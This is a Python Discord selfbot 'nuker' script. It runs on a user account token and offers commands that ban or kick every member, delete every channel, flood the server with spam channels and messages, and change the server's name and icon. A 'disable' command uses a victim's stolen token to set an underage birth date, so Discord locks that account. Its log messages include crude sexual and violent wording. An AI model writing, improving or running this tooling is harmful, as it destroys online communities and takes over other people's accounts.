class NUKER():
    __version__ = 1.5

import discord
import time
from discord.ext import commands
from colorama import Fore, init 
import requests
import os 
import json

with open('config.json') as f:

    config = json.load(f)
token = config.get('token')
prefix = config.get('prefix')
wizzn = config.get('wizzname')

print ("Loading..")

bot = commands.Bot(command_prefix=prefix, self_bot=True)

bot.remove_command('help')

@bot.event
async def on_connect():
    os.system('cls')
    print(f'''{Fore.RED}
  ██████ ▄▄▄█████▓ ▄▄▄       ▄████▄  ▓█████▓██   ██▓    ███▄    █  █    ██  ██ ▄█▀▓█████  ██▀███  
▒██    ▒ ▓  ██▒ ▓▒▒████▄    ▒██▀ ▀█  ▓█   ▀ ▒██  ██▒    ██ ▀█   █  ██  ▓██▒ ██▄█▒ ▓█   ▀ ▓██ ▒ ██▒
░ ▓██▄   ▒ ▓██░ ▒░▒██  ▀█▄  ▒▓█    ▄ ▒███    ▒██ ██░   ▓██  ▀█ ██▒▓██  ▒██░▓███▄░ ▒███   ▓██ ░▄█ ▒
  ▒   ██▒░ ▓██▓ ░ ░██▄▄▄▄██ ▒▓▓▄ ▄██▒▒▓█  ▄  ░ ▐██▓░   ▓██▒  ▐▌██▒▓▓█  ░██░▓██ █▄ ▒▓█  ▄ ▒██▀▀█▄  
▒██████▒▒  ▒██▒ ░  ▓█   ▓██▒▒ ▓███▀ ░░▒████▒ ░ ██▒▓░   ▒██░   ▓██░▒▒█████▓ ▒██▒ █▄░▒████▒░██▓ ▒██▒
▒ ▒▓▒ ▒ ░  ▒ ░░    ▒▒   ▓▒█░░ ░▒ ▒  ░░░ ▒░ ░  ██▒▒▒    ░ ▒░   ▒ ▒ ░▒▓▒ ▒ ▒ ▒ ▒▒ ▓▒░░ ▒░ ░░ ▒▓ ░▒▓░
░ ░▒  ░ ░    ░      ▒   ▒▒ ░  ░  ▒    ░ ░  ░▓██ ░▒░    ░ ░░   ░ ▒░░░▒░ ░ ░ ░ ░▒ ▒░ ░ ░  ░  ░▒ ░ ▒░
░  ░  ░    ░        ░   ▒   ░           ░   ▒ ▒ ░░        ░   ░ ░  ░░░ ░ ░ ░ ░░ ░    ░     ░░   ░ 
      ░                 ░  ░░ ░         ░  ░░ ░                 ░    ░     ░  ░      ░  ░   ░     
                            ░               ░ ░                                                   


                                                            {Fore.MAGENTA}Made by Artix
    ''')
    print(f'{Fore.RED}                      Version | {NUKER.__version__}')
    print(f'{Fore.MAGENTA}                      Logged in as: | {bot.user.name}#{bot.user.discriminator}')
    print(f'{Fore.YELLOW}                      User ID | {bot.user.id}')
    print(f'{Fore.GREEN}                      Prefix | {prefix}')
    print('')

@bot.command()
async def cmd(ctx):
 await ctx.message.delete()
 embed = discord.Embed(color=ctx.author.color, timestamp=ctx.message.created_at)

 embed.set_author(name="*Stacey's Commands* 💦", icon_url=ctx.author.avatar_url)

 embed.add_field(name="wizz", value="*fucks the server", inline=False)
 embed.add_field(name="ban", value="*bans everyone", inline=False)
 embed.add_field(name="kick", value="*kicks everyone*",inline=False)
 embed.add_field(name="purge", value="*hide and seek fucc boa", inline=False)
 embed.add_field(name="spam", value="*yuhh get into it*", inline=False)
 embed.add_field(name="ping", value="*ping pong*", inline=False)
 embed.add_field(name="disable", value="*disables an acc*", inline=False)
 embed.set_image(url="https://cdn.discordapp.com/attachments/723551082961436813/726059304486174852/nba.gif")
 embed.set_footer(text="Rico | 14tacey")
 embed.set_thumbnail(url="https://i.imgur.com/yVhwJch.gif")
 await ctx.send(embed=embed)
 embed = discord.Embed(color=ctx.author.color, timestamp=ctx.message.created_at)

@bot.command()
async def wizz(ctx):
        os.system("cls")    
        ban = -1
        delete = 0
        create = 0
        for member in ctx.guild.members:
            try:
                ban += 1
                await member.ban()
                print(f"{Fore.RED}[{Fore.RESET}Status{Fore.RED}] Banned{Fore.RESET}: {Fore.RED}[{Fore.RESET}{member}{Fore.RED}]")
            except:
                continue
        with open('trans.png', 'rb') as porn:
            data = porn.read()
            await ctx.guild.edit(icon=data)
        await ctx.message.delete()
        print(f"{Fore.RESET}> {Fore.RED}Running Rape Process{Fore.RESET}...\n")
        await ctx.guild.edit(name=wizzn)
        print(f'{Fore.RED}[{Fore.RESET}Status{Fore.RED}] Guild Icon: {Fore.RED}[{Fore.RESET}Changed{Fore.RED}]')
        print(f'{Fore.RED}[{Fore.RESET}Status{Fore.RED}] Changed Guild Name To: {Fore.RED}[{Fore.RESET}{wizzn}{Fore.RED}]\n')
        print(f"\n{Fore.RESET}> {Fore.RED}Successfully Banned [{Fore.RESET}{ban}{Fore.RED}] Members{Fore.RESET}.")
        for channel in ctx.guild.channels:
                try:
                    delete += 1
                    await channel.delete()
                except:
                    continue    
        print(f"{Fore.RESET}> {Fore.RED}Successfully Removed [{Fore.RESET}{delete}{Fore.RED}] Channels{Fore.RESET}.")               
        for i in range(1, 16):
            try:
                create += 3
                await ctx.guild.create_text_channel(name=f'{wizzn} {i}')
                await ctx.guild.create_voice_channel(name=f'{wizzn} {i}')
                await ctx.guild.create_category(name=f'{wizzn} {i}')
            except:
                pass
        print(f"{Fore.RESET}> {Fore.RED}Successfully Created [{Fore.RESET}{create}{Fore.RED}] Channels{Fore.RESET}.") 

@bot.command()
async def ban(ctx):
    os.system("cls")     
    tit = -1
    await ctx.message.delete()
    print(f"{Fore.RESET}> {Fore.RED}Running ban process{Fore.RESET}...")
    for member in ctx.guild.members:
        try:
            tit += 1
            await member.ban()
            print(f"{Fore.RED}[{Fore.RESET}Status{Fore.RED}] Banned{Fore.RESET}: {Fore.RED}[{Fore.RESET}{member}{Fore.RED}]")
        except:
            continue
    print(f"\n{Fore.RESET}> {Fore.RED}Successfully Banned [{Fore.RESET}{tit}{Fore.RED}] Members{Fore.RESET}.")       

@bot.command(pass_context=True)
async def kick(ctx):
    await ctx.message.delete()
    await ctx.send("***14tacey***")
    show_avatar = discord.Embed(

     color = discord.Color.dark_red() 
    )
    show_avatar.set_image(url='https://cdn.discordapp.com/attachments/706143195985346641/707003306869784686/ezgif-7-fb6260eff4e3.gif')
    await ctx.send(embed=show_avatar)
    print ("Starting Up Nuker")
    print ("Kicking All....")
    for user in list(ctx.guild.members):
        try:
            await ctx.guild.kick(user)
            print (f"{user.name} has been kicked from {ctx.guild.name}")
        except:
            print (f"{user.name} has NOT been kicked from {ctx.guild.name}")

@bot.command()
async def ping(ctx):
    await ctx.message.delete()
    await ctx.send(f"`{round(bot.latency *1000)}ms.`")

@bot.command()
async def purge(ctx, amount: int): # b'\xfc'
    await ctx.message.delete()
    async for message in ctx.message.channel.history(limit=amount).filter(lambda m: m.author == bot.user).map(lambda m: m):
        try:
           await message.delete()
        except:
            pass

@bot.command()
async def spam(ctx, amount: int, *, message): # b'\xfc'
    await ctx.message.delete()    
    for _i in range(amount):
        await ctx.send(message)

@bot.command()
async def disable(ctx, _token):
    await ctx.message.delete()
    r = requests.patch('https://discordapp.com/api/v6/users/@me', headers={'Authorization': _token}, json={'date_of_birth': '2017-7-16'})
    if r.status_code == 400:
       await ctx.send(f"`Account disabled. RIP`")
       print(f'[{Fore.RED}+{Fore.RESET}] Account disabled successfully')
    else:
       await ctx.send(f"`Invalid token cuhh`")
       print(f'[{Fore.RED}-{Fore.RESET}] Invalid token')


@bot.command()
async def channels(ctx):
    await ctx.message.delete()
    for i in range(1, 25):
              await ctx.guild.create_text_channel(name=f'DONTFUCKWITHSTACEY {i}')
              await ctx.guild.create_voice_channel(name=f'STACEY LOVES U {i}')
              await ctx.guild.create_category(name=f'RICOWASHERE {i}')
              print(f'{Fore.GREEN}Spam role and channel creating proccession has been complete.')
              print('')
              print('completed cuh')

bot.run(token, bot=False)
